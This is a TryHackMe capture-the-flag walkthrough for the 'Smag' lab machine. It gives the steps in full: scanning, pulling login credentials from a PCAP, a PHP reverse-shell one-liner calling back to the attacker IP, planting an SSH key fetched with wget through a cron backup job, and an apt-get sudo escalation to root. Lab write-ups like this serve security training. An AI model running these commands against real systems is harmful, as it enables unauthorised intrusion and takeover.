If you use own VM you need to use VPN.

1. Download your VPN file on THM if you havenâ€™t done that already, find it and do following command: sudo openvpn FILE.ovpn
2. then hit your password and you ready to dive in...

I would like to add, do not use these tools on a network youre not allowed to scan, its illegal and they see what you do.
===================================================================
As usally lets start with our NMAP scan and Gobuster.

nmap -sC -sV IP (found 22,80)
gobuster dir -u http://IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
------------------------------------------------------------------
in the /mail directory I found 3 messages, which is PCAP, With wireshark I can analyze the PCAP files.
While analyzing, I found it intresting this "login.php" so I followed the HTTP steam on 4th frame.
We get to know the host which we should add to an host file to be accepted on the server. We gained
credentials for login which is perfect!

Host: development.smag.thm
username: helpdesk
password: cH4nG3M3_n0w

sudo nano etc/hosts
add your IP and development.smag.thm (save it, by exit, cat is to see you got it)
ping development.smag.thm (You should get response now, good!)

Lets do an reverse shell! Just do following and you should have one! IP ADDR to get your local IP.

rlwrap nc -nlvp 4100

http://development.smag.thm/ (press login and than do the command under with you local IP (IP ADDR))
php -r '$sock=fsockopen("10.9.0.105",4100);exec("/bin/bash -i <&3 >&3 2>&3");'

You could navigate thorough the system, but we can not access any files, we need to do more...
Lets see if there is any intresting in scheduled tasks? 

cat /etc/crontab

The final cron seems to be a task for copying keys, so I kept looking deeper...

ls -l /opt/.backups/jake_id_rsa.pub.backup

ssh-keygen -t rsa (command to create a own new public key in a new window, name it jake and press enter until key created)
ls
cat jake.pub
python -m SimpleHTTPServer 8080

(back to the reverse shell window)
cd /tmp
wget http://10.9.0.105:8080/jake.pub
ls
cat jake.pub (Nice seems work! After this you can close the python server)

It creates a new public key, wait 2 minutes and you should be able to login, without password.

ssh -i jake jake@10.10.129.0

cd /home
ls
cd jake
ls
cat user.txt

What is the user flag?

To get root flag, lets find how we can esculate this further. It seems we can use apt-get. By googling arround I found a
way to use it as exploit. I usually find my stuff from gtfobins website. Its a great tool to use.

sudo -l 
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
whoami
cd /root
ls
cat root.txt

What is the root flag?
